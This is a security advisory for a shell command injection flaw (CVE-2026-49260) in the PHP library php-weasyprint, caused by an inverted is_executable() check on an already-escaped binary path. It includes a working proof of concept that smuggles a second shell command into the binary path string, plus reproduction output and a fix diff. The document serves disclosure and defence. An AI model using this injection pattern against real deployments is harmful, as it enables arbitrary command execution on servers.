# [H] php-weasyprint: shell command injection via configurable WeasyPrint binary path due to inverted is_executable() guard (mirror of KnpLabs/snappy GHSA-vpr4-p6fq-85jc)

## Summary
Severity: High
Advisory: GHSA-f5gc-qxf8-mh9g
CVE: CVE-2026-49260
CWE: CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-f5gc-qxf8-mh9g
Type: github-advisory

## Affected
- Packagist: `pontedilana/php-weasyprint` — affected >=0 <2.5.1

## Details
### Summary

`pontedilana/php-weasyprint` builds the shell command for WeasyPrint by passing the binary path through `escapeshellarg()` first and then checking the *quoted* result with `is_executable()`. On POSIX `escapeshellarg('/usr/local/bin/weasyprint')` returns `'/usr/local/bin/weasyprint'` with the single-quote characters as part of the string, so `is_executable()` looks for a file whose actual name includes those quotes. That file never exists, the "safe" branch is dead code, and the raw `$binary` string (set via the constructor or `setBinary()`) flows directly into `Symfony\Component\Process\Process::fromShellCommandline()`. Any deployment whose binary path is sourced from configuration, an environment variable, or a per-tenant setting reaches a shell-command-injection sink. The library is documented as a one-to-one substitute for KnpLabs/snappy and inherited the exact pre-fix codepath KnpLabs patched in [GHSA-vpr4-p6fq-85jc](https://github.com/KnpLabs/snappy/security/advisories/GHSA-vpr4-p6fq-85jc) (Snappy 1.7.1).

### Affected versions

`pontedilana/php-weasyprint` versions `<= 2.5.0` (current `master` tip commit `c2b51fed0bf442c3bf0292b879a09944d436f2a0`, 2026-04-03).

Patched in: 2.5.1

### Privilege required

Any caller that can influence the binary string handed to the `Pdf` constructor or to `AbstractGenerator::setBinary()`. Typical reach paths:

- An application config file (`config/services.yaml`, `.env`, helm chart value) read at boot time, where the path is auto-detected from environment or driven by a per-tenant override.
- An admin UI that lets operators pick between multiple WeasyPrint builds (`weasyprint-v60`, `weasyprint-v66`) for compatibility reasons.
- A multi-tenant SaaS that resolves binary location from a tenant config row.

Once an attacker plants a string containing shell metacharacters in one of those channels, every subsequent `generate()` call shells out the injected payload as the PHP process user.

### Vulnerable code

[`src/AbstractGenerator.php#L169-L172`](https://github.com/pontedilana/php-weasyprint/blob/c2b51fed0bf442c3bf0292b879a09944d436f2a0/src/AbstractGenerator.php#L169-L172):

```php
protected function buildCommand(string $binary, string $input, string $output, array $options = []): string
{
    $escapedBinary = \escapeshellarg($binary);
    $command = \is_executable($escapedBinary) ? $escapedBinary : $binary;
```

[`src/Pdf.php#L167-L170`](https://github.com/pontedilana/php-weasyprint/blob/c2b51fed0bf442c3bf0292b879a09944d436f2a0/src/Pdf.php#L167-L170) overrides `buildCommand` with the same guard:

```php
protected function buildCommand(string $binary, string $input, string $output, array $options = []): string
{
    $escapedBinary = \escapeshellarg($binary);
    $command = \is_executable($escapedBinary) ? $escapedBinary : $binary;
```

`escapeshellarg($binary)` returns a single-quoted string. `is_executable()` then looks up a file whose name literally contains the surrounding single-quote characters, which essentially never exists. The ternary therefore always falls through to the right-hand side, where `$command` is the raw, unescaped `$binary` string. The rest of the command construction (options, input, output) is correctly escaped, so injection has to land in the binary segment — which is exactly the segment configuration-driven deployments treat as trusted.

This is the same primitive KnpLabs/snappy patched in version 1.7.1. The README of `php-weasyprint` states: "This library is massively inspired by KnpLabs/snappy, of which it aims to be a one-to-one substitute (GeneratorInterface is the same)." The vulnerable `buildCommand` was copied verbatim and never updated.

### How `$binary` reaches the shell

```
caller code
  └── new Pdf($binary)                 // src/Pdf.php constructor
        └── parent::__construct($binary)
              └── $this->setBinary($binary)               // src/AbstractGenerator.php:276
                        $this->binary = $binary;          // no validation

later, at conversion time:

  $pdf->generate($input, $output, $options)
        └── $this->getCommand($input, $output, $options)  // src/AbstractGenerator.php:298
              └── $this->buildCommand($this->binary, ...) // src/AbstractGenerator.php:306
                    └── ($vulnerable guard, see above)
                    └── returns $command including raw $binary
        └── $this->executeCommand($command)               // src/AbstractGenerator.php:202
              └── Process::fromShellCommandline($command, null, $this->env, null, $this->timeout)
                    └── /bin/sh -c $command               // shell metacharacters interpreted
```

No intermediate validator, no scheme check, no allow-list. Whatever string reaches `setBinary()` is shell-evaluated.

### Proof of concept

```php
<?php
require __DIR__ . '/vendor/autoload.php';

use Pontedilana\PhpWeasyPrint\Pdf;

@unlink('/tmp/php_weasyprint_rce_marker');

// Attacker-controlled binary string (e.g. coming from config / env / tenant settings).
$binaryString = 'weasyprint --version > /dev/null; touch /tmp/php_weasyprint_rce_marker; #';

$pdf = new Pdf($binaryString);
$pdf->setTimeout(5);

try {
    $pdf->generate('about:blank', '/tmp/poc_out.pdf', [], true);
} catch (Throwable $e) {
    // WeasyPrint binary call fails (its actual exit status is irrelevant);
    // the injected 'touch' between the ';' separators already ran.
}

if (file_exists('/tmp/php_weasyprint_rce_marker')) {
    echo "RCE MARKER PRESENT — injection landed.\n";
} else {
    echo "RCE marker absent — injection did NOT land.\n";
}
```

The `#` at the end of `$binaryString` comments out the unrelated `'/dev/null' '/tmp/poc_out.pdf'` tail that `buildCommand` appends, keeping the shell line syntactically valid.

### End-to-end reproduction (against pinned Composer install)

```bash
# 1. Pin the affected version
mkdir poc-weasyprint && cd poc-weasyprint
cat > composer.json <<'EOF'
{
    "require": { "pontedilana/php-weasyprint": "2.5.0" }
}
EOF
composer install --no-dev --quiet

# 2. Run the PoC
php poc.php
```

Captured run output (PHP 8.5.6, macOS arm64):

```
--- buildCommand output (uses reflection to peek) ---
weasyprint --version > /dev/null; touch /tmp/php_weasyprint_rce_marker; # '/dev/null' '/tmp/poc_out.pdf'
--- end buildCommand ---

generate() threw (expected, weasyprint binary call may fail): RuntimeException: The file '/tmp/poc_out.pdf' was not created (command: weasyprint --version > /dev/null; touch /tmp/php_weasyprint_rce_ma...

--- post-exec check ---
RCE MARKER PRESENT — injection landed.
stat: -rw-r--r--@ 1 rick  wheel  0  5月 25 13:44 /tmp/php_weasyprint_rce_marker
```

Interpretation:

| Observation | Expected if guard worked | Actual |
|---|---|---|
| Compiled command starts with `weasyprint --version ...; touch ...; #` | Should be wrapped in single quotes, e.g. `'weasyprint --version > /dev/null; touch /tmp/...; #'` | Raw, unquoted |
| `/tmp/php_weasyprint_rce_marker` after `generate()` | Absent (binary path validation rejects) | Present — injected `touch` ran |

The marker file is created by the injected command sequence, not by the WeasyPrint binary; the WeasyPrint call inside the same shell line fails afterwards (no PDF produced), but the injected payload has already executed.

Negative control on a benign binary path:

```bash
php poc_negctrl.php
# --- buildCommand for benign binary ---
# /usr/local/bin/weasyprint '/dev/null' '/tmp/poc_out_neg.pdf'
# Benign-path negative control clean: no spurious marker.
```

Even the benign path is emitted raw (without single-quotes around the binary), confirming the `is_executable()` guard never returns true — defensive depth is gone for every deployment, not just the malicious one.

Fix verification: replacing both `buildCommand` overrides with the KnpLabs/snappy 1.7.1 shape (`if (!\is_executable($binary)) throw new RuntimeException(...); $command = \escapeshellarg($binary);`) and re-running the same harness:

```
--- patched buildCommand output ---
[OK] buildCommand rejected malicious binary at the guard. msg: The binary 'weasyprint --version > /dev/null; touch /tmp/php_weasyprint_rce_marker_patched; #' is not executable.
generate() threw (expected, the corrected guard rejects the malicious $binary): RuntimeException: The binary 'weasyprint ...' is not executable.
PATCH OK — marker absent, injection blocked.
```

The corrected guard runs `is_executable()` on the unescaped `$binary`. For the attacker payload that lookup returns false (no file by that name exists on disk), the exception fires before `Process::fromShellCommandline` is ever called, and the marker file is never created.

### Impact

- Shell-command injection as the PHP-FPM / CLI user whenever the WeasyPrint binary path is influenced by configuration, environment, or per-tenant settings.
- Affects every consumer that does not hard-code a constant binary path baked into the deployed code. Empirically, both the project's own README and tests demonstrate the binary path as a configurable constructor argument (`new Pdf('/usr/local/bin/weasyprint')`), and downstream framework integrations (Symfony / Laravel) typically wire it through container config.
- Defensive-in-depth regression even for hard-coded paths: a reader of `buildCommand` reasonably expects the binary to be shell-escaped because the code visually claims to do so. Any later change that reads the binary from a less-trusted source inherits the dead guard.

CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (7.6, High) — adjust to AV:N when the binary path is reachable from an unauthenticated request surface (e.g. an admin endpoint without proper auth).

### Suggested fix

Mirror the KnpLabs/snappy 1.7.1 fix shape exactly (the upstream library this project explicitly mirrors):

```diff
--- a/src/AbstractGenerator.php
+++ b/src/AbstractGenerator.php
@@
     protected function buildCommand(string $binary, string $input, string $output, array $options = []): string
     {
-        $escapedBinary = \escapeshellarg($binary);
-        $command = \is_executable($escapedBinary) ? $escapedBinary : $binary;
+        if (!\is_executable($binary)) {
+            throw new \RuntimeException(sprintf("The binary '%s' is not executable.", $binary));
+        }
+        $command = \escapeshellarg($binary);
```

Apply the identical change to `src/Pdf.php::buildCommand`. The `is_executable()` check now runs against the raw `$binary` (the only string that can name a real file on disk), and the `escapeshellarg()` call only quotes a string that has already been verified as a real executable path on the local filesystem.

A regression test that asserts `buildCommand` throws on a `$binary` string containing `;` / `&&` / `|` should be added so the dead-guard pattern cannot reappear silently.

### Credit

Reported by tonghuaroot.

## References
- https://github.com/KnpLabs/snappy/security/advisories/GHSA-vpr4-p6fq-85jc
- https://github.com/pontedilana/php-weasyprint/security/advisories/GHSA-f5gc-qxf8-mh9g
- https://nvd.nist.gov/vuln/detail/CVE-2026-49260
- https://github.com/pontedilana/php-weasyprint/commit/9e86a2b317237fc5728f712f5037164530117f7e
- https://github.com/pontedilana/php-weasyprint
- https://github.com/pontedilana/php-weasyprint/releases/tag/2.5.1
